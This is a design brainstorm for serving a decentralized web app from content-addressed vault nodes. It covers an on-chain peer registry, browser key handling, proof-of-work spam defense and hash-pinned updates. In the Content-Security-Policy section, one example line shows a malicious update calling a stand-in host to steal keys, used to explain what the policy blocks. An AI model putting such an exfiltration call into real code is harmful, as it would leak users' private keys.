# Brainstorm 016: Decentralized Web Access

**Date:** 2026-03-25
**Status:** Brainstorm — critic-chain validated (5 rounds, 33 issues, all FATAL/HIGH resolved)
**Relates to:** Vault (P2P content), Chain (RPC), Web Explorer

---

## Problem

To participate in Open Systems, users currently need:
- The chain binary
- The vault daemon
- Python CLI tools (os-git, MCP server)
- Knowledge of a specific host IP

This excludes non-technical users and ties access to a specific machine. If the host goes offline, access is lost. Friends on Windows can't participate without WSL or native builds.

## Goal

Any person on any device opens a browser, connects to the Open Systems network, and participates — posting, voting, governing, contributing. No install. No specific server. No single point of failure. If one node goes down, another serves the same experience.

## Design

### Core Principle: The Web App Is Vault Content

The frontend (HTML/JS/CSS) is stored in the vault as content-addressed blobs — same as any other content. Every vault node holds a copy. Any node can serve it. The app is identical everywhere because it's the same bytes (same hash).

When the app is updated, a new version is stored with a new hash. The update flows through the standard governance process — someone submits the new frontend as a contribution, the community votes, the new hash becomes the "current" frontend.

### Architecture

```
User opens browser
  → connects to ANY known peer (seed list or friend's link)
  → peer's vault serves the web app (content-addressed)
  → web app queries chain via that peer's RPC endpoint
  → chain returns peer registry (all known vault/RPC endpoints)
  → app caches peer list, reconnects to any peer if current one drops
  → user's keypair lives in browser (localStorage or IndexedDB)
  → user's identity is on-chain
  → participation from anywhere, any device, any OS
```

### Component 1: On-Chain Peer Registry

Nodes that want to serve the network register their endpoints on-chain.

```rust
/// Registration message
RegisterPeer {
    vault_url: String,       // e.g., "https://node1.example.com:9191"
    rpc_url: String,         // e.g., "https://node1.example.com:26657"
    web_url: Option<String>, // e.g., "https://node1.example.com:8080"
}

RenewPeer {}                 // extends registration for another 10,000 blocks
DeregisterPeer {}            // voluntary removal
CleanupPeers {}              // permissionless crank: removes expired entries

/// Queries
ListPeers { start_after: Option<String>, limit: Option<u32> } → Vec<PeerInfo>
RandomPeers { count: u32 } → Vec<PeerInfo>  // random sample for browser peer selection
```

Registration uses PoW (same ante handler as all 0-XP transactions). No XP required — anyone who can run a node should be able to register it.

**Eclipse attack defense:** PoW alone is insufficient — an attacker can register many fake peers cheaply (~2s each) and dominate the registry. Defenses:
1. **Age-weighted selection.** The browser preferentially selects long-lived peers (high renewal count) over freshly registered ones. A peer that has renewed 100 times over months is far more likely to be honest than one registered 5 minutes ago. The `PeerInfo` struct includes `registered_at` and `renewal_count`.
2. **Known-good set.** The browser maintains a local "known-good" set of peers it has successfully transacted through before (TX confirmed on-chain via that peer). When doing multi-peer verification, it always includes peers from its known-good set, not just random registry samples.
3. **Minimum renewal count for verification.** The multi-peer verification only considers peers with renewal_count >= 10 (i.e., peers that have been alive for ~7 days). Newly registered peers can serve content but are excluded from the verification pool.

Peers can be reported and removed through governance if they serve modified content.

**Liveness:** Peers must renew their registration every 10,000 blocks (~18 hours). Renewal is a simple TX (PoW if 0 XP, free if >0 XP). Expired peers are cleaned up lazily — each `RegisterPeer` and `RenewPeer` transaction removes up to 5 expired entries as a side effect. This bounds state growth without requiring a separate crank or incentive. A permissionless `CleanupPeers { limit: u32 }` crank is also available for bulk cleanup if needed.

**Self-deregistration:** `DeregisterPeer {}` — node operator voluntarily removes their entry.

**Where this lives:** A lightweight peer registry module on the governance contract (3 messages: Register, Renew, Deregister, plus the CleanupPeers crank). Query: `ListPeers {} → Vec<PeerInfo>` (filters to non-expired only).

### Component 2: Vault Serves Web Content

The vault daemon gets a new route group for serving web applications:

```
GET /app/{manifest_hash}              → serves index.html (convenience redirect)
GET /app/{manifest_hash}/{path}       → serves the file at {path}
GET /app/{manifest_hash}/*            → SPA fallback: serves manifest's "fallback" file
```

**Resolution flow:**
1. Vault fetches manifest from content store by `manifest_hash`
2. Parses manifest JSON to find `files[path]`
3. Fetches file content by the file's hash
4. Serves with the `Content-Type` from the manifest's `mime` field
5. If path not found in manifest → serve the `fallback` file (SPA routing)

**Manifest format:**
```json
{
  "version": 1,
  "files": {
    "index.html": { "hash": "sha256...", "mime": "text/html" },
    "app.js": { "hash": "sha256...", "mime": "application/javascript" },
    "style.css": { "hash": "sha256...", "mime": "text/css" },
    "favicon.ico": { "hash": "sha256...", "mime": "image/x-icon" }
  },
  "fallback": "index.html"
}
```

**Caching:** The vault caches parsed manifests in memory (they're small and frequently accessed). File content is served directly from the content store (already in-memory or on-disk depending on vault configuration).

**Current app hash:** Stored on-chain in `APP_CONFIG` on the governance contract. Updated through `UpdateAppHash` governance proposals. Vault nodes query the chain for the current hash and serve it as the default when users hit `/app/` without a specific hash.

**CORS:** The `/app/` routes set appropriate CORS headers so the served SPA can make cross-origin requests to the chain's RPC endpoint.

**Content-Security-Policy:** The vault sets a strict CSP on all `/app/` responses:
```
Content-Security-Policy:
  script-src 'self';
  connect-src <whitelist of vault/RPC URLs from peer registry>;
  object-src 'none';
  base-uri 'self';
```
The `connect-src` whitelist is derived from the on-chain peer registry — the vault queries `ListPeers` and constructs the CSP dynamically. This prevents a compromised app update from exfiltrating keys to an attacker-controlled server. The app can only communicate with registered peers. A malicious update that tries to `fetch("https://evil.com/steal-keys")` is blocked by the browser's CSP enforcement.

### Component 3: Browser-Native Chain Client

The web app talks to the chain's RPC endpoint directly. Cosmos SDK RPC is already JSON over HTTP — no special SDK needed.

Key browser-side capabilities:
- **Key generation**: secp256k1 keypair in the browser (CosmJS or minimal vendored lib)
- **Transaction signing**: Sign transactions client-side, submit via RPC
- **Query**: Read chain state via ABCI query endpoints
- **Light client verification**: Verify query responses against Merkle proofs in block headers

```
Browser (JS)
  → builds transaction (Protobuf via CosmJS)
  → signs with local key (decrypted in memory from IndexedDB)
  → POST to peer's RPC /broadcast_tx_commit
  → reads state via GET /abci_query
  → verifies Merkle proof against latest block header
```

**RPC trust model:** A single RPC endpoint can lie about query responses (fake balances, fake proposals, fake peer lists). Honest full nodes return correct ABCI query results, but the browser can't distinguish honest from dishonest by asking one node.

**Defense layers:**
1. **Multi-peer queries for critical state.** The app queries 3+ peers for: peer registry, governance config (AppConfig), XP balances used in voting UI. Majority agreement = accepted. Disagreement = alert user.
2. **Light client proofs (Cosmos standard).** ABCI queries can return Merkle proofs. The app tracks block headers (fetched from multiple peers) and verifies query proofs against the state root. A malicious node cannot fabricate a valid Merkle proof for state it didn't commit. This is the gold standard — used by Keplr and other Cosmos light clients.
3. **Transaction submission to multiple peers.** When submitting a TX, the app sends to 2+ peers. If a malicious peer drops the TX, the others include it.

**Implementation note:** Full light client verification (layer 2) is the target. Multi-peer queries (layer 1) are the practical first step — simpler to implement, catches most attacks. Light client can be added later without changing the app architecture.

No server-side key management. The user's key never leaves their browser.

### Component 4: Seed Discovery (Bootstrap)

The very first connection requires knowing at least one peer. This is the bootstrap problem every P2P network faces. **Every P2P network makes this concession** — Bitcoin has DNS seeds, IPFS has bootstrap nodes, GunJS has relay peers. The goal is to minimize the trust placed in the bootstrap mechanism and eliminate it after first contact.

**Primary mechanism: Link sharing with embedded hash.**

The link format is: `https://node.example.com:8080/app/{manifest_hash}`

The manifest hash is embedded in the URL. The friend sharing the link is the trust anchor — same as giving someone a software download link. After first load:
1. Service worker caches the verified app
2. App fetches full peer registry from chain
3. App stores multiple peer endpoints locally
4. Future loads don't need the original link

**Redundancy mechanisms** (not mutually exclusive):
1. **Multiple seeds in the link.** The shareable link can encode fallback peers: `https://node1.example.com:8080/app/{hash}?fallback=node2.example.com:8080,node3.example.com:8080`. If node1 is down, the app tries node2, node3.
2. **Well-known DNS as convenience.** A domain like `seed.opensystems.network` can resolve to multiple A records (multiple nodes). This is a convenience, not a requirement. If the domain is seized, the app still works via cached peers or direct links.
3. **mDNS for local networks** — already implemented. Peers on the same LAN discover each other automatically.
4. **Cached peer list.** After first successful connection, the app caches the full peer registry in IndexedDB. Even if all seeds go offline, the app has a local list of peers to try.

**Key insight:** The bootstrap is a ONE-TIME trust event. After that, the chain itself is the peer directory. No seed has ongoing power over the user. DNS seizure can't lock out existing users (they have cached peers). It only affects new users who don't have a direct link from a friend.

### Component 5: Peer Resilience

The web app maintains a list of known peers (from the on-chain registry). If the current peer goes down:

1. App detects connection failure
2. Tries next peer in the list
3. Reconnects automatically
4. User experience: brief loading state, then back to normal

Content is the same on every peer (content-addressed). Chain state is the same on every node (consensus). The user's key is local. Switching peers is seamless.

### User Flow: Jake on Windows

1. Jake's friend sends him a link: `https://node.example.com:9191/app/a1b2c3...` (manifest hash in URL)
2. Jake opens it in Chrome. Vault serves the web app. Browser verifies content hash matches URL hash.
3. Service worker caches the verified app. App fetches peer registry from chain.
4. Jake sees the dashboard — subjects, posts, proposals, projects.
5. Jake clicks "Join." Browser generates a keypair, encrypted with a password Jake chooses, stored in IndexedDB.
6. Jake picks a display name. Solves a quick PoW (~2s), transaction registers his name on-chain.
7. Jake writes a post about a Windows dev tool. Solves PoW, submits to "rust" subject.
8. Post enters review period. Community upvotes. After review, Jake earns XP.
9. Jake now has XP — future transactions skip PoW. Participation is instant.
10. Jake bookmarks the page. Next time, if that node is down, the service worker loads the cached app and auto-reconnects to a different peer from the cached registry.
11. Governance approves an app update. Jake sees "Update available — approved by community vote." He clicks update, service worker swaps to new version.

### Security Considerations

#### The Bootstrap Trust Problem (RESOLVED)

**Problem:** On first load, the browser has nothing. It loads the app from a vault node. But verifying the app's hash requires running JavaScript that IS the app being verified. A malicious node can serve a modified app that skips verification. This is the self-verifying code paradox — the code that verifies itself is the code being verified.

**Resolution: Multi-source verification.** The app does NOT self-verify. Instead:

1. **Minimal bootstrap loader.** The first thing served is NOT the full app — it's a tiny HTML page (~50 lines, auditable by eye) whose only job is: fetch the manifest by hash, fetch each file by hash, compute SHA-256 of each fetched blob, compare against the expected hashes, and only then inject the verified app into the DOM. This minimizes the trust surface to ~50 lines of code rather than the entire SPA.

   The manifest hash travels out-of-band via the friend's link: `https://node.example.com:9191/app/{manifest_hash}`. The bootstrap loader is served at this URL. It's small enough that a technical user can view-source and verify it, and it's the same on every node (content-addressed like everything else).

   **Honest framing:** First load is still social trust. You trust your friend's link, same as downloading any software. The bootstrap loader reduces the attack surface (50 lines vs thousands), but a malicious node can still serve a modified loader. There is no way to eliminate this without a native app or browser extension. This is the same trust model as every web application — the difference is that after first load, the trust model improves dramatically (service worker, cross-node verification).

2. **Service worker pins the hash.** After first verified load, a service worker caches the app and its hash. Subsequent loads verify against the pinned hash, not the node. If a node tries to serve different content, the service worker rejects it.

3. **Cross-node verification.** The app queries MULTIPLE peers for the "current app hash" governance parameter. If they all agree, the hash is trusted. A single malicious node can't fake consensus across multiple independent nodes. The app does this on every load, in the background.

4. **Hash upgrade path.** When governance updates the app hash, the OLD app (running in the service worker) fetches the new hash from the chain, verifies it came through governance (the proposal is on-chain, the vote is auditable), and updates the service worker cache. The user sees "App update available — approved by governance on [date]."

**Trust anchor persistence:** The service worker cache is volatile — browsers can evict it under storage pressure, and users can clear it. The trust anchor `(hash, version)` and cached peer list are stored in **IndexedDB** (stronger persistence), not just the SW cache. The service worker reads from IndexedDB on startup. If both SW cache AND IndexedDB are cleared, the user re-bootstraps with the same trust model as first load (social trust via friend's link).

**Net effect:** First load trusts the friend's link (social trust — same as downloading any software). After that, IndexedDB-pinned hash + cross-node verification + governance audit trail protect against malicious nodes. This is stronger than traditional web apps (which trust a single server on every load).

#### Transaction Spam Defense

**Problem:** Zero-fee transactions + anonymous accounts + browser key generation = a JavaScript loop can flood the chain with garbage transactions.

**Resolution: Proof-of-work micro-cost for unsigned/new accounts.**

The chain's ante handler applies a lightweight client-side proof-of-work requirement for accounts with 0 XP. Not mining — a small computational puzzle (like Hashcash) that takes ~2 seconds on a browser. This means:

- **New users:** Can still post, but each transaction costs ~2 seconds of CPU. A spam loop generating 1 TX/2s is manageable for the chain. A human submitting one post doesn't notice.
- **Established users (>0 XP):** No PoW required. XP proves you've created value; you've already passed the humanity test through community verification.
- **Sybil accounts:** Must each independently solve PoW. Creating 1000 accounts and submitting 1000 posts costs ~2000 seconds of CPU. Not economically viable for spam.
- **Governance/voting:** Already XP-gated (no additional defense needed).

This is a chain-level change (Go module in the ante handler), not a contract change. It's the minimum intervention that makes browser-based spam uneconomical without adding fees.

**Fallback:** If PoW proves insufficient, the chain can add per-account rate limits based on XP tier (0 XP = 1 TX/minute, 10 XP = 10 TX/minute, etc.) — enforceable at the ante handler level, not in individual contracts.

**Alternative idea (needs its own critic-chain):** Replace PoW with an onboarding questionnaire — "what subjects interest you, why, what do you want to contribute?" Raises the same cost barrier (bots need AI-generated responses = API tokens = money), but produces useful signal instead of waste heat. Community gets a warm intro, newcomer gets routed to relevant subjects. Unverifiable answers, but PoW is equally unverifiable as proof of humanity — both just raise cost. The difference: questionnaire cost produces something useful.

#### Key Security

- **Browser keys in IndexedDB** are the default for accessibility. IndexedDB has no encryption — keys are readable by any JS on the same origin. For a system where XP = non-transferable reputation, key theft = identity theft.
- **Mitigation layers:**
  1. **Encrypted key storage.** The app encrypts the private key with a user-chosen password before storing in IndexedDB. The key is decrypted in memory only when signing. A compromised app can still read the decrypted key during a signing session, but passive IndexedDB access yields only ciphertext.
  2. **Cosmos wallet extensions (Keplr, Leap).** For users who want real key isolation, support standard Cosmos wallet extensions. Keys live in the extension sandbox, never touch the app's JS context. This is the recommended path for any user with significant XP.
  3. **Key export/import.** Encrypted backup (password-protected file) for portability and recovery. Standard wallet feature.
  4. **On-chain key rotation with challenge period.** Key migration is a two-step process:
     - Step 1: Sign a `RequestMigration { new_key }` TX with the old key. This starts a 24-hour challenge window.
     - Step 2: After 24 hours with no counter-migration, sign `FinalizeMigration {}` with the new key. XP transfers.
     - If the attacker migrates first, the real user can submit a counter-migration (also signed by the old key) during the 24-hour window, which cancels the migration and triggers a governance dispute.
     - **Pre-registered recovery key** (optional): Users can register a recovery key before any compromise. Recovery key can cancel any migration and initiate its own, bypassing the race condition entirely.

- **HTTPS** between browser and node authenticates the server.
- **Peer registry = public target list.** Accepted tradeoff — the registry is needed for peer discovery. Nodes should be resilient to DDoS independently (rate limiting, CDN, etc.).

### Frontend Technology

The web app should be a static SPA (Single Page Application):
- Pure HTML/JS/CSS — no server-side rendering needed
- Vanilla JS or a lightweight framework
- Builds to a set of static files → stored as vault content
- No Node.js, no build server, no npm dependencies at runtime

The simpler the frontend, the smaller the attack surface and the easier to audit through governance.

### What Needs Building

1. **Peer registry** on governance contract. Stores peer endpoints on-chain. Registration uses PoW (no XP gate). Renewal every 10K blocks. Lazy cleanup. Query: `ListPeers {}`.

2. **New governance proposal action: `UpdateAppHash`.**
   ```rust
   ProposalAction::UpdateAppHash {
       manifest_hash: String,   // vault hash of the app manifest
       description_hash: String, // vault hash of changelog/release notes
   }
   ```
   Execution stores the hash in a new `APP_CONFIG` state item on the governance contract:
   ```rust
   pub struct AppConfig {
       pub current_manifest_hash: String,
       pub version: u64,      // monotonic counter, increments on each UpdateAppHash
       pub updated_at: u64,
       pub proposal_id: u64,  // which proposal approved this
   }
   pub const APP_CONFIG: Item<AppConfig> = Item::new("app_config");
   ```
   The `version` field is a monotonic counter that increments on every `UpdateAppHash` execution. The service worker stores `(hash, version)` and rejects any update where the returned version is <= its pinned version — **preventing downgrade attacks**.

   **Cross-node verification for updates:** The service worker queries at least 3 peers for `AppConfig`. If a majority agree on the same `(hash, version)`, the update is accepted. On disagreement, the app alerts the user and refuses to update.

   **Small network caveat:** During early bootstrap, the network may have only 3-5 peers (possibly run by the same group). The app displays the total registered peer count and warns when the verification pool is small: "Verified against 3 of 3 total peers — low diversity." Users in a small network are implicitly trusting the operator group, same as any early-stage project. As the network grows, verification diversity increases naturally.
   Query: `AppConfig {} → AppConfig`. Any node can query this to know which app version to serve.

3. **Vault `/app/` route** — serves web content from a manifest with MIME types and SPA routing.

4. **Web app manifest format:**
   ```json
   {
     "version": 1,
     "files": {
       "index.html": { "hash": "sha256...", "mime": "text/html" },
       "app.js": { "hash": "sha256...", "mime": "application/javascript" },
       "style.css": { "hash": "sha256...", "mime": "text/css" }
     },
     "fallback": "index.html"
   }
   ```
   Each file entry includes its MIME type (no guessing). `fallback` handles SPA routing — unknown paths serve the fallback file.

5. **Browser chain client** — Cosmos SDK transaction building, signing (secp256k1), querying. Use CosmJS or a minimal subset. This is the heaviest dependency (~200KB).

6. **Frontend SPA** — dashboard, posts, voting, governance, key management (encrypted IndexedDB + Cosmos wallet support).

7. **PoW ante handler** — Go module for the chain binary. Lightweight proof-of-work for 0-XP accounts. Tiered: 0 XP = PoW required, >0 XP = no PoW.

8. **Service worker** — caches verified app, pins manifest hash, handles offline graceful degradation, manages app updates from governance.

### Deployment Flow for App Updates

1. Developer builds new frontend version
2. Stores all files in vault, creates manifest, stores manifest
3. Submits governance proposal: "Update web app to hash {new_manifest_hash}"
4. Community reviews the new frontend (can fetch and inspect all files by hash)
5. Community votes
6. If approved, on-chain "current app hash" parameter is updated
7. All nodes now serve the new version

The web app governs its own updates through the same governance process as everything else.

### Relation to Existing Web Explorer

The current web explorer (`opensystems/web/`) is a Python server-rendered app. It would be replaced by this static SPA approach. The Python server was always a development tool — the production web interface is vault-served, decentralized, and governed.

---

## Open Questions

1. **Web app bundle size limits.** How large can a vault-served SPA be before it's impractical? Probably fine — modern SPAs are 1-5MB, vault handles arbitrary blob sizes.

2. **Offline-first.** Should the web app cache chain state locally for offline reading? Service worker + IndexedDB could enable offline browsing with sync-on-reconnect.

3. **Mobile optimization.** Same app on mobile browsers? Or a separate PWA? Leaning: same app, responsive design, PWA manifest for "add to home screen."

4. ~~Cosmos wallet integration~~ — **RESOLVED:** Yes, support Keplr/Leap as the recommended path for users with significant XP. Browser-native keys (encrypted IndexedDB) as the default for accessibility.

5. **Transaction fees.** The chain has zero-fee transactions (we control gas prices). But if the chain transitions to PoS with real gas, the web client needs to handle fee estimation.

## Critic Chain Results

**5 rounds, 33 total issues (3 FATAL + 14 HIGH + 16 MODERATE). All FATAL and HIGH resolved.**

| Round | FATAL | HIGH | MOD | Key Fixes |
|-------|-------|------|-----|-----------|
| 1 | 2 | 4 | 5 | Bootstrap loader (not self-verifying), PoW spam defense, encrypted IndexedDB + wallet extensions, hash-in-URL, UpdateAppHash governance action, manifest with MIME/SPA routing |
| 2 | 0 | 4 | 5 | PoW-only peer registration (no XP gate), monotonic version counter (downgrade defense), multi-peer RPC verification + light client proofs, peer liveness/renewal/lazy cleanup |
| 3 | 0 | 4 | 4 | IndexedDB trust anchor (not just SW cache), lazy peer cleanup on write, small-network diversity warning, fixed internal contradiction |
| 4 | 1 | 2 | 2 | Minimal bootstrap loader (50 lines, auditable), strict CSP headers, eclipse defense (age-weighted selection, known-good sets, min renewal count), key rotation challenge period |
| 5 | 0 | 0 | 0 | Converged |

### Key Architectural Decisions

1. **First load is social trust** — honest framing, same as downloading any software. Minimal bootstrap loader reduces attack surface.
2. **PoW for 0-XP accounts** — makes browser-based spam uneconomical without adding fees. Skipped after earning XP.
3. **Service worker + IndexedDB** — pins verified app hash, caches peer list, survives browser restarts. Degrades to social trust if both cleared.
4. **Multi-peer verification** — 3+ long-lived peers must agree on app hash/version before updates. Age-weighted selection defeats eclipse attacks.
5. **CSP enforcement** — vault sets strict Content-Security-Policy, whitelist derived from peer registry. Prevents key exfiltration.
6. **Peer liveness** — 10K-block renewal, lazy cleanup on write, self-deregistration. No governance overhead for dead peer removal.
7. **Key rotation with challenge period** — 24-hour window prevents race condition, optional recovery key for pre-compromise defense.

### Remaining MODERATE Issues (implementation notes)

1. TLS for IP-only nodes (no standard certs without a domain)
2. CosmJS bundle size (~600KB) vs minimal frontend aspiration
3. PoW difficulty should be governance-adjustable
4. Vault nodes should auto-fetch current app manifest on startup
5. Fallback peers in URL only help when node is down, not compromised
6. `RandomPeers` query needs deterministic pseudo-random in CosmWasm
7. Browser should verify individual file hashes after download (end-to-end integrity)
8. Onboarding questionnaire as PoW alternative (needs its own critic-chain)

---

## References

- GunJS peer discovery model
- Bitcoin DNS seed approach
- IPFS content-addressed web hosting
- Cosmos SDK RPC API specification
- Current web explorer: `opensystems/web/`
- Vault API: `/data/Dev/Open Systems/vault/src/api.rs`
